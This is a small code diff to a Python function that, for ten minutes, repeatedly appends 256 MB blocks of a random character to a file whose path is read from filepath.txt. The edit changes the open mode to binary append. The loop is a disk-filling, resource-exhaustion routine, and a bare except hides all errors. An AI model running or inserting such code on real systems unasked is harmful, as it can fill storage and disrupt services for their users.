@@ -22,7 +22,7 @@ def append(filepath=open("./filepath.txt", 'r').readline().strip(), seconds=600)
 	while end - start < seconds:
 		choice = random.choice(string.printable)
 		try:
-			f = open(cat, 'a')
+			f = open(cat, 'ab')
 			f.write(choice * ((2 ** 20) * 256)) # 256 Mb
 			f.close()
 		except:
